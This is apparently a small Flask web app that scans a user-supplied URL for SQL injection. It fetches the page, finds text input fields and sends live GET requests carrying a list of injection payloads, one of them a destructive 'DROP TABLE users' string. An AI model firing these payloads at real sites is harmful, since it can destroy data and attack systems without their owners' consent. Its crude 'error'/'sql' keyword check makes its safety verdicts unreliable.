from flask import Flask, request, jsonify, render_template
from lxml import html
import requests

app = Flask(__name__)

# SQL injection payloads
sql_injection_payloads = [
    "' OR 1=1 --",
    "1'; DROP TABLE users; --", 
    "' OR 1=0 --",
    "' OR x=x --",
    "' OR 1=1#",
    "' OR 1=0#",
    "' OR x=x#",
    "' OR 1=1--",
    "' OR 1=0--",
    # Add more payloads as needed
]

# Function to parse input fields and test for SQL injection by actually sending requests
def parse_input_fields(tree, url):
    input_fields = tree.xpath("//input[@type='text']")
    results = []
    vulnerability_found = False  # Flag to track if a vulnerability is found
    
    for field in input_fields:
        name = field.get("name")
        if name:
            field_results = {"field": name, "tests": []}
            for payload in sql_injection_payloads:
                # Simulate testing the input field with actual SQL payload in a GET request
                test_url = f"{url}?{name}={payload}"
                
                try:
                    # Send a request with the SQL injection payload
                    response = requests.get(test_url)
                    
                    # Check for SQL injection by inspecting the response for common errors or anomalies
                    if "error" in response.text.lower() or "sql" in response.text.lower():
                        test_result = "Potential vulnerability found"
                        vulnerability_found = True
                    else:
                        test_result = "No vulnerability detected"
                
                except Exception as e:
                    test_result = f"Error: {str(e)}"
                
                field_results["tests"].append({"payload": payload, "result": test_result})
            
            results.append(field_results)

    return results, vulnerability_found

# Route to handle vulnerability checking
@app.route('/check_vulnerability', methods=['POST'])
def check_vulnerability():
    data = request.get_json()
    url = data.get("url")
    if not url:
        return jsonify({"error": "No URL provided"}), 400

    try:
        # Send a GET request to fetch the page content
        response = requests.get(url)
        response.raise_for_status()
        tree = html.fromstring(response.content)
        
        # Parse the input fields and test for SQL injection vulnerabilities
        results, vulnerability_found = parse_input_fields(tree, url)
        
        # Determine the final result based on vulnerability flag
        final_result = "The website is vulnerable to SQL injection." if vulnerability_found else "The website appears to be safe from SQL injection."
        
        return jsonify({
            "url": url,
            "results": results,
            "final_result": final_result
        })
    
    except requests.RequestException as e:
        return jsonify({"error": "Request failed", "details": str(e)}), 500

# Add a route for the root ("/") path to serve the frontend HTML page
@app.route('/')
def index():
    return render_template('index.html')

# Main entry point to run the app
if __name__ == "__main__":
    app.run(debug=True)



